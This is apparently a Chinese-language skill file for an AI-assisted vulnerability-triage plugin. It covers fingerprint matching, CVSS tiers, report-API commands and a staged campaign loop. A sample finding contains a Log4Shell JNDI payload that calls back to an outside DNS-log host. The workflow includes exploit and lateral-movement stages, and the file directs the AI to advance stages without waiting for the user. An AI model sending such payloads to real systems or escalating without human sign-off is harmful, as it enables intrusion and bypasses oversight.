---
name: kb-triage
description: CVE/PoC 知识库 · 工作方法：指纹到漏洞的匹配流程、PoC 安全验证与取证规范、漏洞报告模板、severity/CVSS 分档规则、把发现写进漏洞报告的方法。先读它再读别的分类可少走弯路；不含具体 CVE。
verified: false
sources: 公开资料整理（CVE 公告 / 公开分析 / 业务逻辑类；出处见各条参考）
---

# 工作方法（3 条）
> 条目为公开资料整理（出处见文末「参考」），`利用步骤` 属待验证假设；出报告前按目标版本自验并把 `verified` 置为 true。

先用这一页定流程，再按目标类型翻具体分类。顺序：**认资产 → 指纹 → 版本 → 匹配 → 最小验证 → 利用 → 取证 → 清理**。

## 条目

| 文件 | 漏洞 | 严重度 | 入口 |
|---|---|---|---|
| `fingerprint-workflow.md` | 指纹到漏洞的匹配流程 | info | - |
| `report-template.md` | 漏洞报告模板 | info | - |
| `safe-verification.md` | PoC 安全验证与取证规范 | info | - |

## 三条铁律

1. **版本对不上就不下结论**：PoC 打过去没反应，可能是补丁、可能是 WAF、可能是版本不在区间——三者要分开写。
2. **先只读后写入**：未授权判定优先用 `GET /version`、`INFO`、`/actuator`、配置读取；写入型 PoC（写马、改配置）放到有授权的第二步。
3. **每条结论都要有可复现的最小证据**：一条命令 + 一段原始响应（截图不算，要文本）。

## 严重度 / CVSS 分档规则（本库统一口径）

| 情况 | severity | cvss 参考 |
|---|---|---|
| 无鉴权 RCE / 域或设备接管 / 资金面（可影响余额或资金状态） | critical | 9.0-10.0 |
| 需低权 RCE / 任意文件读 / 越权读敏感数据 / 凭据泄露 | high | 7.0-8.9 |
| 需特定条件的信息泄露 / 枚举 / 低频滥用 | medium | 4.0-6.9 |

- **资金面一律 critical**（哪怕 CVSS 算出来 8.x），并在条目里写明"可影响资金状态"。
- CVSS 只是参考值，条目里的 severity 以本表口径为准；两者冲突时以本表为准并改 cvss。
## 把发现写进漏洞报告（每个确认的漏洞都写一条）

插件在最上面有一个「漏洞报告」页签，它读的是 `$DSH_HOME/vuln-report/findings.json`。**每确认一个漏洞就用一条命令写入**（端口以实际 GUI 为准，默认 127.0.0.1:54429）：

```bash
curl -s -X POST http://127.0.0.1:54429/api/dsh-prompt-custom/findings \
  -H 'content-type: application/json' \
  -d '{
    "action":"upsert",
    "title":"Apache Log4j2 JNDI 注入（Log4Shell）",
    "severity":"critical",
    "cvss":10.0,
    "target":"oa.example.com",
    "url":"https://oa.example.com/api/login",
    "category":"Java 反序列化 / JNDI",
    "cve":"CVE-2021-44228",
    "verified":true,
    "evidence":"User-Agent: ${jndi:ldap://x.dnslog.cn/a} → dnslog 收到回连，时间为 2026-11-05T09:12:33Z",
    "description":"登录接口的 User-Agent 被写入日志，log4j-core 2.14.1 解析 lookup。",
    "remediation":"升级 log4j-core 到 2.17.0+；临时 -Dlog4j2.formatMsgNoLookups=true。"
  }'
```

- `severity` 只能是 `critical / high / medium / low / info`；分档按本文件"严重度 / CVSS 分档规则"。
- 同一条漏洞再报一次就用返回里的 `id` 带上 `"id":"..."` 更新，不要重复插。
- 修完改状态：`{"action":"status","id":"<id>","status":"fixed"}`；误报用 `false-positive`。
- 导出给人看：浏览器打开 `http://127.0.0.1:54429/api/dsh-prompt-custom/findings.md`，或在页签上点「导出 Markdown」。
- **未验证的不要写 `verified:true`**；证据里只放最小必要片段（脱敏），别把凭据/证件贴进去。
### 端口与编码（两个真实踩过的坑）

- **端口不是固定的 54429**：它是本次 Desktop 运行时的 GUI 端口，每次启动可能不同（例如 57641）。取法：看浏览器地址栏、读当前会话 runtime context，或 `(Get-NetTCPConnection -State Listen | Where-Object LocalPort -gt 1024).LocalPort`。前端页签里的示例会自动带 `location.origin`，直接复制最稳。
- **PowerShell 传中文 JSON 会乱码**：`Invoke-RestMethod -Body '{"title":"SQL 注入"}'` 在 Windows 上按 GBK 送出，宿主回 `400 invalid JSON body`。正确写法：

```powershell
$json = '{"action":"upsert","title":"SQL 注入","severity":"high"}'
Invoke-RestMethod -Uri "http://127.0.0.1:$port/api/dsh-prompt-custom/findings" -Method POST -ContentType 'application/json; charset=utf-8' -Body ([Text.Encoding]::UTF8.GetBytes($json))
```

```bash
# 或者写 UTF-8 文件再发（跨 shell 通用）
curl -s -X POST "http://127.0.0.1:$port/api/dsh-prompt-custom/findings" -H "content-type: application/json" --data-binary "@finding.json"
```

纯英文 payload 不受影响，只有中文/emoji 会踩。
## 用任务台账推进（自动化编排）

插件提供两个接口，配合本文件前面的流程用：

```
POST /api/dsh-prompt-custom/match        {"port":61616,"banner":"ActiveMQ 5.17.3"} → 候选条目（带命中理由）
GET  /api/dsh-prompt-custom/campaigns    任务列表 / ?id= 详情（含 next 建议）
POST /api/dsh-prompt-custom/campaigns    {"action":"create|patch|asset|step|attempt|delete|next", ...}
```

推荐循环（每轮只做一件事，做完写回台账）：

1. `asset`：把新发现的 host/port/指纹写进当前任务；
2. `match`：拿指纹换候选条目，从中选一条（优先 critical）；
3. 按条目 PoC 验证，命中就把结果写 `finding`（漏洞报告页签），并把资产 `status` 改成 `verified`；
4. `step`：把这一步的命令与结论写回（中断后能接着跑）；
5. `next`：取下一阶段建议，`patch` 推进 stage。

`stage` 顺序：recon → fingerprint → match → verify → exploit → lateral → report。
不要把整个战役塞进一轮对话：**每轮一步、每步落库**，这样断点续跑、报告也能自动长出来。
### 绑定会话（只记账，不注入）

- 任务可以记录“属于哪个对话”（`sessionId`），仅用于台账归类与界面展示；
- 插件**不再往运行中的对话注入消息或系统节**：早期版本的 `followup` 唤醒会把会话历史写坏（`messages[N] 缺 role`、provider 拒收中途 system 更新），已移除；
- 人工推进即可：在对话里说“继续任务 X”，AI 读台账后用 `campaign_upsert` 记步骤与阶段。
## 每轮必须走完这四步（不许停在单阶段）

1. `pipeline_next` 读阶段与 `instructions`（返回的清单就是本轮待办）；
2. 按阶段调 `kb_match` 或 `skill`（类别对应关系见插件固定规则节）；
3. 按条目判据验证；命中写 `finding_upsert`，未命中换下一条候选；
4. `campaign_upsert(command, result, advance=true)` 记账并**推进一格**，然后回到第 1 步，直到 `report`。

一个阶段的目标达成后立即推进，不要等用户说「下一步」。